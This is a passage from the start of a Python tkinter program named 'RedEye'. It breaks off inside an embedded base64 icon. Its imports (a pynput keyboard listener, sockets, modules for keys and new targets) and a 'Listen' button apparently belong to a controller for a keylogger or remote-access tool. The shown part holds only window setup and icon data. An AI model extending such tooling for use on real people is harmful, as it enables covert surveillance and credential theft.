#!/usr/bin/env python3

import datetime
import json
import re
import socket
from tkinter.messagebox import askyesno
import _tkinter
import random
import csv
from pyperclip import copy as PYcopy
from pynput import keyboard
from pynput.keyboard import Key
import Securer
from Keys import KD
from KeysTable import Key_table
from new_target import New_Target
from tooltip import ToolTip
from regex import Extract
from timer import Timer
from tkinter.ttk import *
from tkinter.filedialog import asksaveasfile
from tkinter import Listbox, StringVar, BooleanVar, Text, IntVar, Menu, PhotoImage, Variable
from tkinter import Tk, Toplevel
from utils import ICONS, translate_id
import threading
# from PIL import Image, ImageTk

data = ''

app = Tk()
app.title('RedEye')
width = app.winfo_screenwidth()
height = app.winfo_screenheight()
app.geometry('%sx%s+%s+%s' % (width // 2, height // 2, width // 4, height // 4))
app.state("zoomed")
style = Style()

Main_Frame = Frame(app)
Main_Frame.pack(fill='both', expand=True)

Connection_Frame = Frame(Main_Frame)
Connection_Frame.pack(side='top', fill='x')
style.configure("Listen.TButton", foreground='green')

icon_data = "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"
app_icon_data = "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